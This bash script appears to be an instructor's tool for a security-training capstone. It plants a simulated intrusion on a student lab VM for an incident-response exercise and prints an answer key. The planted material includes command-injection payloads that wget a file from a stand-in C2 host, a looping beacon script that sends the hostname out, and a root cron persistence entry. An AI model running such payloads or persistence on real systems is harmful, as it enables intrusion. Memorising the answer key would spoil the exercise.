#!/bin/bash
# SecureCorp capstone -- seed-incident.sh   (v2)
#
# INSTRUCTOR RUNS THIS, as root, ON EACH STUDENT'S TARGET VM (Metasploitable2 + DVWA),
# AFTER the student passes the end-of-Week-2 gate and BEFORE Week 3.
#
# It plants activity the student did NOT cause -- a small, realistic intrusion -- into the
# logs the student is already forwarding to their log box. Week 3 Task 3.3 is finding it and
# deciding whether SecureCorp has a genuine incident.
#
# Details are randomised per run (the attacker IP's last octet, the hour, the filenames) so
# students can't copy each other's answer.
#
# Usage:   sudo ./seed-incident.sh            # random seed
#          sudo ./seed-incident.sh 73 3        # fixed: attacker .73, 03:xx
#          sudo ./seed-incident.sh --clean     # remove everything this script planted
#
# Safe: it only appends log lines and drops one inert script + one cron file. Nothing runs
# against anything real. The C2 host 10.10.10.<octet> does not exist -- the "beacon" cron job
# just fails quietly, which is itself realistic telemetry.

set -u
LOG_AUTH="/var/log/auth.log"
LOG_SYS="/var/log/syslog"
LOG_APACHE="/var/www/dvwa/logs/access.log"       # adjust if your DVWA logs elsewhere
[ -f "$LOG_APACHE" ] || LOG_APACHE="/var/log/apache2/access.log"
[ -f "$LOG_APACHE" ] || LOG_APACHE="/var/log/httpd/access_log"
MARK="# --- securecorp-seed ---"
STATE="/root/.securecorp-seed"

need_root() { [ "$(id -u)" = "0" ] || { echo "run as root (sudo)"; exit 1; }; }

clean() {
  need_root
  echo "[*] removing seeded artifacts"
  [ -f "$STATE" ] && . "$STATE" 2>/dev/null
  rm -f "/etc/cron.d/${CRONNAME:-securecorp-sync}" 2>/dev/null
  rm -rf "/tmp/.cache" 2>/dev/null
  for f in "$LOG_AUTH" "$LOG_SYS" "$LOG_APACHE"; do
    [ -f "$f" ] && grep -v "$MARK" "$f" > "${f}.tmp" 2>/dev/null && mv "${f}.tmp" "$f"
  done
  rm -f "$STATE"
  echo "[*] done. (student-forwarded copies on the log box are NOT cleaned -- that's fine.)"
  exit 0
}

[ "${1:-}" = "--clean" ] && clean
need_root

# --- pick the seed -----------------------------------------------------------------
OCT="${1:-$(( (RANDOM % 55) + 40 ))}"     # attacker last octet 40-94
HOUR="${2:-$(( (RANDOM % 4) + 1 ))}"      # 01:xx .. 04:xx
[ "$OCT" = "5" ] || [ "$OCT" = "10" ] || [ "$OCT" = "20" ] && OCT=71
ATT="10.10.10.${OCT}"
C2="10.10.10.$(( OCT + 3 ))"
DATE="$(date '+%b %e')"
FNAME=".sync$(( RANDOM % 90 + 10 ))"
_cn="cache updater sysmon httpd-cache logrotate-nc net-sync"
CRONNAME="$(echo $_cn | tr ' ' '\n' | sed -n "$(( RANDOM % 6 + 1 ))p")"
M1=$(( RANDOM % 40 + 2 )); M2=$(( M1 + 1 )); M3=$(( M1 + 3 ))
hh=$(printf '%02d' "$HOUR")

cat > "$STATE" <<EOF
OCT=$OCT
ATT=$ATT
C2=$C2
FNAME=$FNAME
CRONNAME=$CRONNAME
EOF

echo "[*] seeding: attacker $ATT, C2 $C2, ~${hh}:${M1}, file /tmp/.cache/$FNAME, cron /etc/cron.d/$CRONNAME"

# --- 1. initial access: command injection via DVWA, from the attacker IP, earlier -----------
if [ -f "$LOG_APACHE" ]; then
cat >> "$LOG_APACHE" <<EOF
$ATT - - [${DATE} ${hh}:0${M1}:11 +0000] "GET /dvwa/vulnerabilities/exec/?ip=127.0.0.1;id&Submit=Submit HTTP/1.1" 200 812 "-" "curl/7.68.0"  $MARK
$ATT - - [${DATE} ${hh}:0${M1}:34 +0000] "GET /dvwa/vulnerabilities/exec/?ip=127.0.0.1;wget+http://${C2}/${FNAME}+-O+/tmp/.cache/${FNAME}&Submit=Submit HTTP/1.1" 200 44 "-" "curl/7.68.0"  $MARK
$ATT - - [${DATE} ${hh}:0${M2}:02 +0000] "GET /dvwa/vulnerabilities/exec/?ip=127.0.0.1;chmod+755+/tmp/.cache/${FNAME}&Submit=Submit HTTP/1.1" 200 44 "-" "curl/7.68.0"  $MARK
EOF
fi

# --- 2. then they log in over SSH: a few failures, then a SUCCESS as msfadmin --------------
cat >> "$LOG_AUTH" <<EOF
$DATE ${hh}:${M2}:41 metasploitable sshd[4102]: Failed password for msfadmin from $ATT port 50122 ssh2  $MARK
$DATE ${hh}:${M2}:44 metasploitable sshd[4102]: Failed password for msfadmin from $ATT port 50122 ssh2  $MARK
$DATE ${hh}:${M2}:49 metasploitable sshd[4108]: Failed password for msfadmin from $ATT port 50140 ssh2  $MARK
$DATE ${hh}:${M3}:03 metasploitable sshd[4131]: Accepted password for msfadmin from $ATT port 50166 ssh2  $MARK
$DATE ${hh}:${M3}:03 metasploitable sshd[4131]: pam_unix(sshd:session): session opened for user msfadmin by (uid=0)  $MARK
$DATE ${hh}:${M3}:20 metasploitable sudo:  msfadmin : TTY=pts/2 ; PWD=/home/msfadmin ; USER=root ; COMMAND=/bin/cp /tmp/.cache/${FNAME} /etc/cron.d/${CRONNAME}  $MARK
$DATE $(printf '%02d' $((HOUR+2))):11:57 metasploitable sshd[4131]: pam_unix(sshd:session): session closed for user msfadmin  $MARK
EOF

# --- 3. the dropped "beacon" script + persistence cron ------------------------------------
mkdir -p /tmp/.cache
cat > "/tmp/.cache/${FNAME}" <<EOF
#!/bin/sh
# (planted by seed-incident.sh -- inert; the host below does not exist on the lab net)
while true; do
  wget -q -O- "http://${C2}:8443/c?h=\$(hostname)" >/dev/null 2>&1
  sleep 600
done
EOF
chmod 755 "/tmp/.cache/${FNAME}"
echo "$MARK planted /tmp/.cache/${FNAME}" >> "$LOG_SYS"

cat > "/etc/cron.d/${CRONNAME}" <<EOF
# $MARK
*/10 * * * * root /tmp/.cache/${FNAME} >/dev/null 2>&1
EOF

# --- 4. cron actually tries to run it, and fails to reach the C2 (realistic) --------------
for i in 1 2 3 4 5 6; do
  mm=$(( (i * 10) % 60 )); h2=$(printf '%02d' $(( HOUR + (i/6) )))
  cat >> "$LOG_SYS" <<EOF
$DATE ${h2}:$(printf '%02d' $mm):01 metasploitable /USR/SBIN/CRON[$((5000+i))]: (root) CMD (/tmp/.cache/${FNAME} >/dev/null 2>&1)  $MARK
EOF
done

echo
echo "[*] SEEDED. The student now investigates:"
echo "    - initial access : command injection from $ATT  (apache log)"
echo "    - foothold        : SSH success as msfadmin from $ATT  (auth.log)"
echo "    - persistence     : /etc/cron.d/${CRONNAME} -> /tmp/.cache/${FNAME}"
echo "    - C2 attempt      : cron beacon to ${C2}:8443 (fails -- host doesn't exist)"
echo "    - the tell        : everything is from $ATT, NOT the student's attacker 10.10.10.5"
echo
echo "    Answer key for you: initial access = DVWA command injection (same bug the student"
echo "    demos in Task 2.6, but earlier and from a different IP). No data exfiltration"
echo "    succeeded (C2 unreachable). Persistence WAS installed -> this is an INCIDENT."
echo
echo "[*] to reset:  sudo $0 --clean"
